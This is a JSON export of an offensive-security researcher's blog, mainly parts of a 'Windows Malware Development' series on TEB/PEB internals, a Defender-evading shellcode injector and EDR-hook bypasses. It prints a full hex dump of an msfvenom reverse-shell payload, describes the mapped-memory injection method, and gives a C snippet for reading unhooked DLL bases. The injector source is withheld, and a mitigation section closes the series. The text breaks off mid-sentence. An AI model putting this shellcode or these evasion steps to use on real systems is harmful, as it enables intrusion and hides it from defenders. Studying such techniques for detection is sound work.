
[{"content":" ","date":"28 October, 2025","externalUrl":null,"permalink":"/","section":"","summary":"\u003ch3 id=\"typeit-6fb22d3943ec7794c447a8e7c1bb77a4\"\u003e\u003c/h3\u003e\n\n\u003cscript\u003e\n    document.addEventListener(\"DOMContentLoaded\", function () {\n      new TypeIt(\"#typeit-6fb22d3943ec7794c447a8e7c1bb77a4\", {\n        strings: [\"\",\"Hello ... You\",\"I fight for the users\",\"We're all alike\",\"\"],\n        speed:  120 ,\n        lifeLike:  false ,\n        startDelay:  0 ,\n        breakLines:  false ,\n        waitUntilVisible:  true ,\n        loop:  true \n      }).go();\n    });\n\u003c/script\u003e","title":"","type":"page"},{"content":"","date":"28 October, 2025","externalUrl":null,"permalink":"/tags/files/","section":"Tags","summary":"","title":"Files","type":"tags"},{"content":"","date":"28 October, 2025","externalUrl":null,"permalink":"/tags/media/","section":"Tags","summary":"","title":"Media","type":"tags"},{"content":"This is a collection of all of my public media and files. I will try and keep these as up to date as possible however, if you want a more up to date version that I have not uploaded yet, please reach out and I will try and get it uploaded as soon as I can.\nAny research paper or presentation is for educational purposes only.\nAdditionally, if you are going to download and share, please give me credit :) Windows Malware Development Presentation # You can download my slide deck that supplements the Windows malware development series below:\nThis is what I have used during my talks at several conferences and events. I have redacted a few things for the purposes of publishing the presentation online. Download Slides ","date":"28 October, 2025","externalUrl":null,"permalink":"/media/","section":"","summary":"This is a collection of all of my public media and files.","title":"Media","type":"page"},{"content":"","date":"28 October, 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":"I am a cybersecurity professional specializing in offensive security and security research. Over the course of my educational and professional career I have earned numerous certifications, given talks, and have done extensive research into computer systems. Some notable contributions include:\nDuring my time at my university while working for a research lab, I built out a new datacenter cluster for security research and protein folding Managed a university datacenter with over 100 servers Conducted and facilitated international joint military cybersecurity exercises Led several teams including white, red, blue, and green, as well as serving as lead engineer on multiple projects Presented talks to students and professionals about my research and how to improve the security of computer systems Developed and researched malware that bypasses endpoint detection Written articles on extensive research into Windows architecture and internal systems Education, Qualifications, and Certifications # CRTO PNPT PMRP PCRP Net+ Sec+ B.S., in Management Information Systems specializing in cybersecurity and a minor in Cybersecurity Member of Synack Red Team (SRT) Contact Me # Email: gr1dgh0st@gridsec.net You may encrypt your message via pgp. If you choose to do so, my public key for communication is below:\n-----BEGIN PGP PUBLIC KEY BLOCK----- xjMEaBQ55BYJKwYBBAHaRw8BAQdAonsuSYWfsrwypD1WRYnXMdxQsVNcWZ30 Q4AJ97h5s4fNLWdyMWRnaDBzdEBncmlkc2VjLm5ldCA8Z3IxZGdoMHN0QGdy aWRzZWMubmV0PsLAEQQTFgoAgwWCaBQ55AMLCQcJkG6ed+CH3NvMRRQAAAAA ABwAIHNhbHRAbm90YXRpb25zLm9wZW5wZ3Bqcy5vcmdp9pTlE9friY0IxASx ldqcTd1FTFyfNDxEp0XIPEANFgMVCggEFgACAQIZAQKbAwIeARYhBAJqMWKK gvCotwnH5m6ed+CH3NvMAABx4QD8Cz9MNPb2GIPfK3XfgyMmMzAyIJadeBgf cZZCvIWRv6AA/1WVvAdXkc8HhH5RrBuSanaxZBz7+O/btbqLKQJCB7gKzjgE aBQ55BIKKwYBBAGXVQEFAQEHQFYQ7ZkD2vBsxvoQVCUwg6I04nBSqDXNEryM 9HW6tJ1gAwEIB8K+BBgWCgBwBYJoFDnkCZBunnfgh9zbzEUUAAAAAAAcACBz YWx0QG5vdGF0aW9ucy5vcGVucGdwanMub3JnRe15NZiT4XSBHnXRFoVjQl9j vJja8YKpb8VEloYQtQUCmwwWIQQCajFiioLwqLcJx+Zunnfgh9zbzAAAFMsB AMG/BGg3MQj7fV4QuuQS4CILzmJ7GmWvygS0cWBYVyJpAQC4hgqSchQaY+vk F68zzTeEoMbfa0UrByDAV64FsUi3Aw== =fhDZ -----END PGP PUBLIC KEY BLOCK-----","date":"5 May, 2025","externalUrl":null,"permalink":"/about/","section":"","summary":"\u003cp\u003eI am a cybersecurity professional specializing in offensive security and security research. Over the course of my educational and professional career I have earned numerous certifications, given talks, and have done extensive research into computer systems. Some notable contributions include:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDuring my time at my university while working for a research lab, I built out a new datacenter cluster for security research and protein folding\u003c/li\u003e\n\u003cli\u003eManaged a university datacenter with over 100 servers\u003c/li\u003e\n\u003cli\u003eConducted and facilitated international joint military cybersecurity exercises\u003c/li\u003e\n\u003cli\u003eLed several teams including white, red, blue, and green, as well as serving as lead engineer on multiple projects\u003c/li\u003e\n\u003cli\u003ePresented talks to students and professionals about my research and how to improve the security of computer systems\u003c/li\u003e\n\u003cli\u003eDeveloped and researched malware that bypasses endpoint detection\u003c/li\u003e\n\u003cli\u003eWritten articles on extensive research into Windows architecture and internal systems\u003c/li\u003e\n\u003c/ul\u003e\n\n\n\u003ch2 class=\"relative group\"\u003eEducation, Qualifications, and Certifications \n    \u003cdiv id=\"education-qualifications-and-certifications\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#education-qualifications-and-certifications\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCRTO\u003c/li\u003e\n\u003cli\u003ePNPT\u003c/li\u003e\n\u003cli\u003ePMRP\u003c/li\u003e\n\u003cli\u003ePCRP\u003c/li\u003e\n\u003cli\u003eNet+\u003c/li\u003e\n\u003cli\u003eSec+\u003c/li\u003e\n\u003cli\u003eB.S., in Management Information Systems specializing in cybersecurity and a minor in Cybersecurity\u003c/li\u003e\n\u003cli\u003eMember of Synack Red Team (SRT)\u003c/li\u003e\n\u003c/ul\u003e\n\n\n\u003ch2 class=\"relative group\"\u003eContact Me \n    \u003cdiv id=\"contact-me\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#contact-me\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eEmail: \u003ca href=\"mailto:gr1dgh0st@gridsec.net\"\u003e\u003cu\u003egr1dgh0st@gridsec.net\u003c/u\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eYou may encrypt your message via \u003ccode\u003epgp\u003c/code\u003e. If you choose to do so, my public key for communication is below:\u003c/p\u003e","title":"About","type":"page"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/tags/debugging/","section":"Tags","summary":"","title":"Debugging","type":"tags"},{"content":" Debugging # One of the questions that occurred to me during the course of this project was what is the gs register and how does it work? I was familiar with the \u0026ldquo;standard\u0026rdquo; CPU registers like eax and rax for 32 bit and 64 bit architectures, but I had not heard of gs. This is what I found out.\nMost CPUs currently have a set of special registers called Model Specific Registers (MSRs). These registers are reserved for use in only the OS kernel, meaning the kernel is responsible for what the register does and how it functions. This is where the gs and fs registers come into play because they are segment registers reserved for some of those MSRs. In Microsoft systems, the gs register is used to point to the TEB in 64 bit systems and the fs is similar but for 32 bit systems. I of course, pulled out the debugger to see this in action:\nWhen inspecting the register further, the value held inside (002B) doesn\u0026rsquo;t seem to correlate to the TEB, nor does it seem to be a 64 bit address. It seems to be some sort of offset but nothing conclusive. In older Windows systems, how the TEB used to be held was through the Global Descriptor Table (GDT). This was an array of Segment Descriptor structures which contained information such as the base address and access rights for that memory region. The gs or fs registers would effectively be an offset to the GDT which would point to the base address of the TEB. However, for compatibility reasons, modern systems have a placeholder value within the gs register that points to a NULL GDT entry:\nNotice the value 002B and it\u0026rsquo;s corresponding entry, is indeed NULL. For more clarity, the value in gs is called the Segment Selector and it not only works as an index, but also describes which table to use. That is because there is also a Local Descriptor Table (LDT) that can be used. Breaking the value within the gs register down, the first few bits describe which table to use and what properties it has. The latter ~13 bits are the actual offset for the specified table.\nGetting to the base address of the TEB is a bit more involved. The base address is actually the base address of the gs register and the offset of the register describes the offset within the TEB. So gs[0x60], as seen in the previous article, is the base address of the gs register plus 0x60. However, because the register is available only to the kernel, user mode debugging won\u0026rsquo;t work. It will require debugging at ring 0. The execution flow diagrams presented in the first article show that when executing in user space, the gs register\u0026rsquo;s MSR is also in user mode and pointing to its corresponding TEB. The transition to kernel mode in the execution flow will also transition the gs MSR into its kernel level MSR using the swapgs syscall. Therefore, there are two key MSRs: IA32_GS_BASE which has an MSR number of 0xC0000101, and IA32_KERNEL_GS_BASE with an MSR number of 0xC0000102. The former being the user mode MSR and the latter being the kernel mode counterpart.\nThe MSR numbers are for AMD64 architectures and may change depending on the architecture and CPU in question. Extracting the base address of the gs register is fairly simple when debugging in kernel mode (ring 0). However it\u0026rsquo;s important to note that because debugging the register requires ring 0 level debugging, the corresponding kernel level MSR number is used rather than the user mode MSR number:\nlkd\u0026gt; rdmsr 0xC0000102 msr[c0000102] = 000000f3`7e837000Reviewing this result from WinDbg shows that this is the base address of the gs register and by extension, the base address of the TEB. This can be proven by showing the TEBs base address and comparing them. Notice how the addresses are the same:\nMalware Mitigation # I will conclude this series with how to mitigate against the technique I used to bypass Defender. The critical piece of information is how the shellcode was copied to the target process. Instead of using common remote process injection WinAPI calls, I used less common and lesser known calls that aren\u0026rsquo;t as prevalent. This means the technique isn\u0026rsquo;t as visible to the detection mechanisms because the engine isn\u0026rsquo;t used to seeing malicious activity corresponding to the calls. This could be improved by monitoring and analyzing changes detected within a process\u0026rsquo;s memory. However, the memory within a process changes quite frequently so using this method will consume a significant amount of resources on the system.\nThe detection could come with correlating two process\u0026rsquo;s talking to each other, specifically when one process is changing another processes memory and subsequently executing code within that memory region. The basic logic flow is that a process creates a new memory region within a target process, modifies it, and then executes it. As a result any logic flow similar to that should be highly scrutinized and analyzed to make sure it is not malicious.\nMost EDRs already do this, but another big red flag is that notepad.exe, a local note taking application, is talking over TCP to a remote system on the network. This application should never do that and it is out of the ordinary to have that happen. The indicators of compromise will show that the application\u0026rsquo;s new thread, which started on the malicious shellcode, is calling out to a listener and subsequently running commands on the local system. Establishing a baseline is critical to knowing what is or is not normal. This can vary depending on the environment but it is well established that notepad.exe does not perform commands nor does it call out over TCP to a remote system.\nIf there are any questions, comments, or concerns on any article in the series, feel free to reach out.\n~ Gr1dGh0st\n","date":"5 May, 2025","externalUrl":null,"permalink":"/posts/windows-malware-development/debugging-and-mitigation/","section":"Posts","summary":"Final part in the \u0026lsquo;Windows Malware Development\u0026rsquo; series","title":"Debugging and Mitigation","type":"posts"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/tags/microsoft/","section":"Tags","summary":"","title":"Microsoft","type":"tags"},{"content":"Here you will find all of my posts listed by date in decending order. Starting with my most recent and ending with my oldest. I hope you enjoy and learn something along the way :)\n","date":"5 May, 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"\u003cp\u003eHere you will find all of my posts listed by date in decending order. Starting with my most recent and ending with my oldest. I hope you enjoy and learn something along the way :)\u003c/p\u003e","title":"Posts","type":"posts"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"5 May, 2025","externalUrl":null,"permalink":"/series/windows-malware-development/","section":"Series","summary":"","title":"Windows Malware Development","type":"series"},{"content":"This series will explain the basics of Windows malware development and a few extra things I have learned along the way including my own research and deep dives. The first part will elaborate on the the theoretical inner workings of Windows and how PE files work under the hood. The second part will explain how it works dynamically and how to abuse PE files to write malware. The third part will dig into the proofs and will debug binaries to see it working in action.\nThis is for educational purposes only. ","date":"5 May, 2025","externalUrl":null,"permalink":"/posts/windows-malware-development/","section":"Posts","summary":"A three part Windows malware development series","title":"Windows Malware Development","type":"posts"},{"content":" AV/EDRs # Now that the theoretical foundation of Microsoft architecture is laid out, how do PE files work dynamically and how can we abuse them? It is worth noting that depending on the threat protection software such as antivirus (AV) or Endpoint Detection and Response (EDR) used, the malware might detected and removed. Threat protection software mainly uses two different detection mechanisms: static and dynamic analysis. Static analysis usually encompasses things like the hash of the file and what it\u0026rsquo;s importing. Dynamic analysis is monitoring the binary at runtime to determine if the actions it takes are malicious or not. For example, Wannacry is a highly signatured malware specimen in which the hash is known to be malicious. However if a single line is changed, it will change the hash, and by extension, not be as detectable. This is when dynamic detection comes into play. If some malware is trying to inject into a process and execute the newly injected code, that can be seen as malicious activity since no process should be injecting code into another process and executing that code. By changing the behavior of the injection process, it can alter how it is detected at runtime. A critical piece in all of this is how AV/EDR engines detect these things and, by extension, how we might avoid detection.\nAV/EDRs change frequently so that what is accurate now might not be in the future. I will try to keep this article updated but it is always a cat and mouse game with malware development. The information presented is accurate as of the date of this article. If there are changes needing to be made, please feel free to reach out to me. TEB \u0026amp; PEB # When the binaries are copied into memory, they are assigned a Thread Environment Block (TEB) and a Process Environment Block (PEB). Both hold information about the specific thread/process such as what modules (DLLs) are loaded, where they are in memory, if the process is being debugged, and much more. The TEB is the initial access vector to all of these. Embedded in the TEB is a pointer to the PEB. There are a few API calls that can be made to access the TEB, but under the hood, they all do the same thing.\nTo access the TEB at the low level, the gs register (x64 bit) will essentially hold a pointer to the base address for the TEB. Thus, a call out to gs:[0x00] in assembly will drop you into the start of the struct.\nThe struct for the TEB can be found in the winternl.h header file. However most of it is undocumented (this is why most of the members are reserved). For the purposes of this article, the official header file definition will do just fine, and appears below: typedef struct _TEB { PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; // Windows 2000 only PVOID Reserved6[4]; PVOID TlsExpansionSlots; } TEB, *PTEB;Notice the second member which is the pointer to the PEB. This member is always at an offset of 0x60 in hex, or 96 bytes. Although this is a kernel level struct, like the NTAPI, therefore the offset can change through updates. That being said, grabbing the PEBs base address can be done in several ways. The way this happens under the hood for all of them (that I am aware of) is a call to gs:[0x60] in assembly. The call goes into the TEB and adds the offset of 0x60 which belongs to the member holding the pointer to the PEB.\nDevelopment # Due to ethical and moral reasons, I will not be providing the source code. As of the writing of this article, it still bypasses Defender and has full capabilities. Therefore, I will not release it; although that may change in future updates to this article. So how did I create my malware and what was my methodology? I started by thinking about what I wanted it to do. Because I have not done this before, I decided to start simple and create a basic TCP reverse shell injector. Although this could be easily done with a Powershell one-liner, I wanted this to be malleable so that any shellcode could be swapped in and it would still work. I also wanted a challenge to bypass WIndows Defender by using a highly signatured payload. The payload I decided to start with was an msfvenom stageless TCP reverse shell. I don\u0026rsquo;t have access to test against enterprise or higher-end EDRs, so please note that the development and objectives here reflect that of bypassing Microsoft Defender.\nAs mentioned previously, AV/EDR engines work distinctly in static and dynamic analysis. The easiest way I have found to bypass with is static analysis using techniques such as encryption. I opted to encrypt my shellcode within a byte array variable. This means that the encrypted shellcode would be held in the .text section of the PE file. Encryption will usually increase the entropy of the file, thus making it more suspicious to the engines. However, Defender doesn\u0026rsquo;t do a deep analysis (that I am aware of) so I wasn\u0026rsquo;t concerned in that regard.\nThe logic of the malware itself is fairly straight forward. The idea is that once it\u0026rsquo;s executed, it will inject the shellcode into the target process, decrypt, and run the payload which will callback to a remote listener. The first thing it does is hunt for the victim process which will become the \u0026ldquo;proxy\u0026rdquo; within which the payload will be injected. This is done for several reasons, but mainly it\u0026rsquo;s because if the EDR catches the shellcode, it won\u0026rsquo;t burn the injector, signature it, and alert on it. Instead it will alert on the target process having malicious shellcode in it and kill that. In an enterprise environment, the target process should also be one that usually performs actions that are aligned with those in which you are taking. For example, if I am injecting a reverse shell into notepad.exe, this should throw alarm bells off since notepad isn\u0026rsquo;t normally reaching out to other systems. In fact it\u0026rsquo;s only there to create local notes on disk. A less suspicious and quiet way is to inject into explorer.exe because that usually is connected to file shares and reaching out to other systems in the network. Even better, what if firefox.exe is running? That also would work as it always is reaching out to the internet. In the wild, it would be best to manually search the processes currently running in the system and see which ones fit your use case. For my proof of concept, I elected to use notepad.exe as the target process as that is a good way to control the behavior of my malware along with debugging and showing the capabilities. It also will be more suspicious and thus is a good way to showcase this process (given that is for educational purposes).\nOnce it finds the target process, it will create a mapping of memory between itself and the target. Effectively this means that any changes in the specified memory region will be replicated across both processes. Think of it as when a symlink is used between directories in the file system but instead of it being directories on the disk, it is a region within memory. This is done because injecting memory into a process is highly monitored and signatured. For example, using the VirtualAllocEx WinAPI function (which creates a memory region within a target process) will get caught most of the time when using it to inject a malicious payload because it has been used for malicious purposes too many times. For this reason, even with encryption, for every change in the memory region, Defender will potentially scan it. As mentioned above, processes should seldom be injecting into other processes and executing that injected code. I found that a way around this scrutiny is to map the two processes together to create virtually a single address space within which I can work. I do this first before decrypting the shellcode because when the allocation of the new memory region takes place, it also zeros it out. Therefore, when the memory is scanned, it will look benign with only zeros and nothing else within it.\nNow that the location of the shellcode is allocated and mapped, I am able to decrypt the shellcode. Windows Defender (and other EDRs) usually scan the memory when changes occur. This is why I zero out the new region when the initial allocation is done. This is especially prevalent when injecting new data from one process\u0026rsquo;s memory to another because it isn\u0026rsquo;t local to the current process. However, because of the mapped region, I can decrypt and copy the shellcode locally within the mapped memory without having to touch the target process. It is fairly normal for a process to manipulate its own memory so Defender usually won\u0026rsquo;t scrutinize it closely. Once copied, the target process will contain the malicious shellcode injected into it and all that is left is to execute it.\nThe execution uses a simple call to create a new thread on the target process, but instead of starting the thread with the intended starting address, I can specify it to start with the base address of the mapped memory holding the shellcode. This will start the execution of the injected malicious shellcode and, therefore, gain a callback to my listener for the reverse shell.\nTo make sure it wasn\u0026rsquo;t a one off (or something strange happened), I executed it multiple times and still got the same result. I also created an executable version of the payload through msfvenom and as soon as it touched the disk, it got caught. The results of these tests suggest that this method is valid, and my stager successfully bypassed Windows Defender!\nHere is a quick proof of concept demo to show the malware in action:\nYour browser does not support the video tag. The Windows box is fully up to date, and as you can see there are no threats detected. This result means that Defender did not alert or pick up on any malicious activity even though the shellcode was executed and got a successful callback to the remote listener. Let\u0026rsquo;s go a bit more in depth for the memory analysis to observe the shellcode in the live memory dump:\nNotice the first few bytes of the payload. This is important because the byte array of fc 48 83 e4 is a well known signature of msfvenom payloads; they usually start this way or some similar form. In other words, this signifies the successful injection and detection bypass of Defender with a known malicious signature. Following that, you can see the rest of the payload in the mapped memory region. This matches up to what the original shellcode was that was generated before being encrypted and loaded into the malware:\n┌──(kali㉿kali)-[~] └─$ xxd byte.bin 00000000: fc48 83e4 f0e8 c000 0000 4151 4150 5251 .H........AQAPRQ 00000010: 5648 31d2 6548 8b52 6048 8b52 1848 8b52 VH1.eH.R`H.R.H.R 00000020: 2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0 H.rPH..JJM1.H1. 00000030: ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed .\u0026lt;a|., A...A.... 00000040: 5241 5148 8b52 208b 423c 4801 d08b 8088 RAQH.R .B\u0026lt;H..... 00000050: 0000 0048 85c0 7467 4801 d050 8b48 1844 ...H..tgH..P.H.D 00000060: 8b40 2049 01d0 e356 48ff c941 8b34 8848 .@ I...VH..A.4.H 00000070: 01d6 4d31 c948 31c0 ac41 c1c9 0d41 01c1 ..M1.H1..A...A.. 00000080: 38e0 75f1 4c03 4c24 0845 39d1 75d8 5844 8.u.L.L$.E9.u.XD 00000090: 8b40 2449 01d0 6641 8b0c 4844 8b40 1c49 .@$I..fA..HD.@.I 000000a0: 01d0 418b 0488 4801 d041 5841 585e 595a ..A...H..AXAX^YZ 000000b0: 4158 4159 415a 4883 ec20 4152 ffe0 5841 AXAYAZH.. AR..XA 000000c0: 595a 488b 12e9 57ff ffff 5d49 be77 7332 YZH...W...]I.ws2 000000d0: 5f33 3200 0041 5649 89e6 4881 eca0 0100 _32..AVI..H..... 000000e0: 0049 89e5 49bc 0200 115c c0a8 7c80 4154 .I..I....\\..|.AT 000000f0: 4989 e44c 89f1 41ba 4c77 2607 ffd5 4c89 I..L..A.Lw\u0026amp;...L. 00000100: ea68 0101 0000 5941 ba29 806b 00ff d550 .h....YA.).k...P 00000110: 504d 31c9 4d31 c048 ffc0 4889 c248 ffc0 PM1.M1.H..H..H.. 00000120: 4889 c141 baea 0fdf e0ff d548 89c7 6a10 H..A.......H..j. 00000130: 4158 4c89 e248 89f9 41ba 99a5 7461 ffd5 AXL..H..A...ta.. 00000140: 4881 c440 0200 0049 b863 6d64 0000 0000 H..@...I.cmd.... 00000150: 0041 5041 5048 89e2 5757 574d 31c0 6a0d .APAPH..WWWM1.j. 00000160: 5941 50e2 fc66 c744 2454 0101 488d 4424 YAP..f.D$T..H.D$ 00000170: 18c6 0068 4889 e656 5041 5041 5041 5049 ...hH..VPAPAPAPI 00000180: ffc0 4150 49ff c84d 89c1 4c89 c141 ba79 ..API..M..L..A.y 00000190: cc3f 86ff d548 31d2 48ff ca8b 0e41 ba08 .?...H1.H....A.. 000001a0: 871d 60ff d5bb f0b5 a256 41ba a695 bd9d ..`......VA..... 000001b0: ffd5 4883 c428 3c06 7c0a 80fb e075 05bb ..H..(\u0026lt;.|....u.. 000001c0: 4713 726f 6a00 5941 89da ffd5 G.roj.YA.... EDR Evasion # With the knowledge presented thus far, there are a few theoretical ways to improve this malware to bypass high end and enterprise EDRs. Although I don\u0026rsquo;t go into every possible way this could be achieved, the following are a couple that I have researched and learned over the course of this project.\nSome EDRs work by hooking into a plethora of DLLs commonly used and proxying the calls to their functions through the EDRs engine. This in turn performs correlation analysis to determine if there is any malicious activity. Both of these techniques use functionalities to call the original DLLs functions, thereby, bypassing the hooked function.\nThe the first technique builds from how the WinAPI works as described in the previous article. Calling the API natively will get caught through the EDR. Instead calling the NTAPI version from ntdll.dll could potentially alleviate some detection (although most EDRs now hook into ntdll.dll anyway). Directly calling the syscall would be even better because the call is going through the kernel itself without needing any DLLs to assist, thus bypassing the hooked functions.\nA second way to bypass the hook is through the PEB. Specifically there are a few members within the PEB that provide information useful to call the original function. Grabbing a specific member will give a pointer to the base address to the function without the hook in place. To do this there are a few extra things to know such as how to grab the TEB in the first place.\nThe following TEB struct is a more comprehensive version that has been documented over the years thanks to the Vergilius Project which documents the undocumented Windows structures. However the TEB is massive, so this is just a snippet of it: struct _TEB { struct _NT_TIB NtTib; //0x0 VOID* EnvironmentPointer; //0x38 struct _CLIENT_ID ClientId; //0x40 VOID* ActiveRpcHandle; //0x50 VOID* ThreadLocalStoragePointer; //0x58 struct _PEB* ProcessEnvironmentBlock; //0x60 ULONG LastErrorValue; //0x68 ULONG CountOfOwnedCriticalSections; //0x6c VOID* CsrClientThread; //0x70 VOID* Win32ThreadInfo; //0x78 ULONG User32Reserved[26]; //0x80 ULONG UserReserved[5]; //0xe8 VOID* WOW32Reserved; //0x100 ULONG CurrentLocale; //0x108 ULONG FpSoftwareStatusRegister; //0x10c VOID* ReservedForDebuggerInstrumentation[16]; //0x110 VOID* SystemReserved1[25]; //0x190 VOID* HeapFlsData; //0x258 ULONGLONG RngState[4]; //0x260 CHAR PlaceholderCompatibilityMode; //0x280 UCHAR PlaceholderHydrationAlwaysExplicit; //0x281 CHAR PlaceholderReserved[10]; //0x282 ULONG ProxiedProcessId; //0x28c ............ };If you want to get the base address of the TEB, you have to do it in a roundabout way. Specifically, the first member of the TEB is a Thread Information Block (TIB) struct. This struct contains information about the current thread as shown below:\nstruct _NT_TIB64 { ULONGLONG ExceptionList; //0x0 ULONGLONG StackBase; //0x8 ULONGLONG StackLimit; //0x10 ULONGLONG SubSystemTib; //0x18 union { ULONGLONG FiberData; //0x20 ULONG Version; //0x20 }; ULONGLONG ArbitraryUserPointer; //0x28 ULONGLONG Self; //0x30 }; The Self member holds a pointer to the base address of the TEB itself. This means that within the first member of the TEB and last member within that, we can grab the base address of the TEB struct. The offset from the beginning of the TEB to the last member of the TIB is 0x30. Referencing gs:[0x30] in assembly will grab the base address in which the TEB is located. A simple call to __readgsqword(0x30) in C will do just that and get the base address to the TEB. However to get the PEB because it\u0026rsquo;s at an offset of 0x60, means adjusting the call to __readgsqword(0x60).\nThe struct for the PEB contains a member of interest, which is ldr, and is of the type PEB_LDR_DATA. The ldr or \u0026ldquo;loader\u0026rdquo; is a struct that holds information pertinent to the DLLs required for the process. These structs can be found below: typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;Within the ldr there is a doubly linked list called InMemoryOrderModuleList. This is of the type LIST_ENTRY. Because it is a doubly linked list the native construction for it contains only two members: Flink and Blink. The former is a pointer to the next entry within the list, while the latter is a pointer to the previous entry. My assumption is they mean \u0026ldquo;forwards link\u0026rdquo; and \u0026ldquo;backwards link\u0026rdquo; respectively.\nThe LIST_ENTRY structure definition is held in the ntdef.h header file. This is the \u0026ldquo;template\u0026rdquo; for any doubly linked lists in Windows. However, the only capabilities it has are to go either forwards or backwards in the list. There is no information that can be stored so modifying the list is needed. This can be done by creating a new struct with the name being NameOfStruct_ENTRY. This will allow the modification to insert information in the list. Microsoft has done this for InMemoryOrderModuleList and made the name _LDR_DATA_TABLE_ENTRY. The structs can be seen below: typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY; typedef struct _LDR_DATA_TABLE_ENTRY { PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID Reserved3[2]; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; #pragma warning(push) #pragma warning(disable: 4201) // we\u0026#39;ll always use the Microsoft compiler union { ULONG CheckSum; PVOID Reserved6; } DUMMYUNIONNAME; #pragma warning(pop) ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;The InMemoryOrderModuleList member is a doubly linked list of LIST_ENTRY structures which point to LDR_DATA_TABLE_ENTRY structs. These hold the information related to a specified DLL required for the process. For each required DLL, there is an LDR_DATA_TABLE_ENTRY structure for it. The two members to note are the DllBase and FullDLLName. The former points to where the DLL for the process is located in memory and the latter is the name of the DLL. In order to get the base address of a specific DLL in this way, we would have to loop through the list and compare the name of the one we want to the name member. Once one is found, grab the DllBase member which would point to the base address.\nHowever how some EDRs work (specifically SentinelOne (S1)) as of the date of this article), is that they modify the DllBase member of the DLLs they are monitoring and change it to their own. This is important because most hooks don\u0026rsquo;t take place this deep within the process. There is an undocumented member of the LDR_DATA_TABLE_ENTRY struct which can bypass the hooked member and get the clean base address for the specified DLL. This member is called OrgininalBase and is at an offset of 0xf8.\nFor example walking through the debugger with WinDbg, I can start with finding the PEB and, by extension, the Ldr:\nClicking into the Ldr shows the member I mentioned before which is InMemoryOrderModuleList:\nOnce more, clicking into the list will show the LIST_ENTRY struct which gives the Flink and Blink members. The addresses to the right of them are their pointers to the LDR_DATA_TABLE_ENTRY structs:\nThe first entry in the linked list is always describing the process. In this case that would be notepad.exe for the name of the module. To show that, take the address the Flink is pointing to and look at the LDR_DATA_TABLE_ENTRY for it:\nAs seen in the FullDllName member, the first link in the list is notepad.exe which corresponds to the current process the PEB is describing. In order to get the DLLs, click the Flink again and it will move by one position in the list. The pointer will now point to the first DLL loaded within the process which usually is ntdll.dll:\nNotice how the address changed. Take the address and show the LDR_DATA_TABLE_ENTRY for that:\nThe FullDllName is now ntdll.dll which means we are in the entry for ntdll. As I mentioned, looking at the members, the DllBase shows the current base address for the DLL. At the bottom at offset 0x0f8, the OriginalBase member appears as well. The values seem different at first but that is because DllBase is a pointer and OriginalBase is a static value.\nGiven that I don\u0026rsquo;t have S1 to test, I was poking around with how this member works and it gave me the same address of the DllBase member. I don\u0026rsquo;t have any way to prove or disprove this theory but testing shows, it could work. One thing to note is because it is undocumented, I had to call it by its offset instead of the member directly.\nThe PoC code snippet I used to calculate it is shown below for the OriginalBase, although the same code was conducted for the DllBase. Instead of 0xf8 offset, it is 0x30 which corresponds to DllBase:\nLDR_DATA_TABLE_ENTRY* mod = (LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(pDataTableEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); size_t offset = 0xf8; UINT8* pBase = (UINT8*)mod; UINT8* calc = pBase + offset; HMODULE finalAddy = *(HMODULE*)calc; return finalAddy;The output of the addresses is as 